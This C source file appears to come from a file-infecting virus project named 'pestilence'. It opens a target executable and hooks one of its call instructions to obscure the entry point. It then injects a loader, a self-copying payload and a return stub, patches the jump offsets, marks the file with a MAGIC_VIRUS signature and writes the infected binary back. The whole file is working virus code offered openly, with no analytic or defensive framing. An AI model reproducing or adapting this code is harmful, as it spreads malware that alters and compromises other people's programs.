#include "pestilence.h"

static void	init_info(t_info *info)
{
    info->text_begin = 0;
    info->text_size = 0;
    info->valid_target = 1;
}

static void	hook_call(t_info *info)
{
    int32_t	new_jmp;

    new_jmp = (int32_t)(info->text_size - (size_t)((size_t)(info->addr_call_to_replace) - (size_t)(info->text_begin)) - 5);
    ft_memcpy(info->addr_call_to_replace + 1, &new_jmp, sizeof(new_jmp));
}


static void	patch_loader(t_info *info)
{
    int32_t	start;
    int32_t	end;
    int32_t val;

    start = info->text_addr + info->text_size + LOADER_SIZE;
    end = (int32_t)(info->addr_payload + MAIN_OFFSET);
    // 	end = (int32_t)(info->addr_payload + (size_t)(&main) - (size_t)(&ft_memcpy));
    val = end - start;

    // rewrite jmp to payload
    ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE - 4, &val, 4);

    // 	start = info->text_addr + info->text_size + LOADER_SIZE + 44;
    end = info->addr_payload;
    val = end - start;
    // rewrite addr for mprotect
    ft_memcpy(info->text_begin + info->text_size + 44, &val, 4);
}

static void	inject_loader(t_info *info)
{
    void		*addr;

    addr = &loader;
    hook_call(info);
    ft_memcpy(info->text_begin + info->text_size, addr, LOADER_SIZE);
    patch_loader(info);
}

static void	patch_payload(t_info *info)
{
    int32_t	start;
    int32_t	end;
    int32_t	val;

    start = (int32_t)(info->addr_payload + PAYLOAD_SIZE);
    end = info->text_addr + info->text_size + LOADER_SIZE;
    val = end - start;

    // replace jmp addr
    ft_memcpy(info->file + info->offset_payload + PAYLOAD_SIZE - 4, &val, 4);
    // replace ret by jmp
    val = 0xe9;
    ft_memcpy(info->file + info->offset_payload + PAYLOAD_SIZE - 5, &val, 1);
    // replace leave by pop rbp
    val = 0x5dec8948;
    ft_memcpy(info->file + info->offset_payload + PAYLOAD_SIZE - 9, &val, 4);
}

static void	inject_payload(t_info *info)
{
    void		*addr;

    addr = &ft_memcpy;
    ft_bzero(info->file + info->begin_bss, info->bss_size);
    ft_memcpy(info->file + info->offset_payload, addr, PAYLOAD_SIZE);
    patch_payload(info);
}

static void	patch_end(t_info *info)
{
    int32_t	start;
    int32_t	end;
    int32_t	val;

    start = info->text_addr + info->text_size + LOADER_SIZE + END_SIZE;
    end = (int32_t)((size_t)(info->addr_hooked_func) - (size_t)(info->text_begin) + info->text_addr);
    val = end - start;
    ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + END_SIZE - 4, &val, 4);
}

static void	inject_end(t_info *info)
{
    void		*addr;	

    addr = &ft_end;
    ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE, addr, END_SIZE);
    patch_end(info);
}

static void	patch_addresses(t_info *info)
{
    int32_t		start;
    int32_t		end;
    int32_t		val;

    // &loader
    start = info->addr_payload + OFFSET_1 + 4;
    end = (int32_t)((size_t)(info->text_begin) + (size_t)(info->text_size) - (size_t)(info->file));
    val = end - start;
    ft_memcpy(info->file + info->offset_payload + OFFSET_1, &val, 4);

    // &ft_memcpy
    start = info->addr_payload + OFFSET_2 + 4;
    end = (int32_t)(info->addr_payload);
    val = end - start;
    ft_memcpy(info->file + info->offset_payload + OFFSET_2, &val, 4);

    // &ft_end
    start = info->addr_payload + OFFSET_3 + 4;
    end = (int32_t)(info->text_addr + info->text_size + LOADER_SIZE);
    val = end - start;
    ft_memcpy(info->file + info->offset_payload + OFFSET_3, &val, 4);
}

static int	write_file(t_info info, char *name)
{
    int fd;

    if ((fd = ft_sysopen(name, O_WRONLY | O_CREAT | O_TRUNC)) ==  -1)
	return (1);
    ft_syswrite(fd, info.file, info.file_size);
    ft_sysclose(fd);
    return (0);
}

static int		reload_mapping(t_info *info)
{
    void	*new;
    size_t	new_size;

    new_size = info->file_size + info->bss_size + PAYLOAD_SIZE;
    if ((new = ft_sysmmap(0, new_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
	return (1);
    ft_memcpy(new, info->file, info->file_size);
    ft_sysmunmap(info->file, info->file_size);
    info->file = new;
    info->file_size = new_size;
    return (0);
}

static int		inject_sign(t_info *info)
{
    uint32_t	magic = MAGIC_VIRUS;
    char		buf[0x40];

    ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + END_SIZE, &magic, 4);
    write_sign(buf);
    ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + END_SIZE + 4, buf, SIGN_SIZE);
    return (0);
}

int		main()
{
    char	buf[BUF_SIZE];

    write_begin(buf);
    ft_syswrite(1, buf, 8);
    struct stat		st;
    int			fd;
    t_info			info;

    write_filename_src(buf);
    if ((fd = ft_sysopen(buf, O_RDWR)) ==  -1)
	return (1);
    init_info(&info);
    ft_sysfstat(fd, &st);
    info.file_size = st.st_size;
    if ((info.file = ft_sysmmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
	return (1);
    pe_parsing(&info);
    if (reload_mapping(&info) == 1)
	return (1);
    if (find_text(&info) == 1)
	return (1);
    epo_parsing(&info);
    if (info.valid_target == 0)
	return (1);
    inject_loader(&info);
    inject_payload(&info);
    inject_end(&info);
    patch_addresses(&info);
    inject_sign(&info);
    ft_sysclose(fd);
    write_filename_src(buf);
    ft_syswrite(1, buf, 9);
    write_file(info, buf);
    return (0);
}
